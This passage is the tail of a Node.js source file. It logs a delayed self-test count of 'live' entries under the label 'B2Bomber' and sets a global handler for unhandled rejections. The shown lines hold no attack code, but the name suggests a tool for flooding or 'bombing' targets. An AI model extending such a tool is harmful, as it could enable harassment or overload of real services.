        .then((r) => console.log(`[B2Bomber] self-test done: ${r.ok}/${r.total} live`))
        .catch((e) => console.log('[B2Bomber] self-test failed:', e?.message));
    }, 4000);
  }
});

process.on('unhandledRejection', (e) => console.log('[unhandledRejection]', e?.message || e));
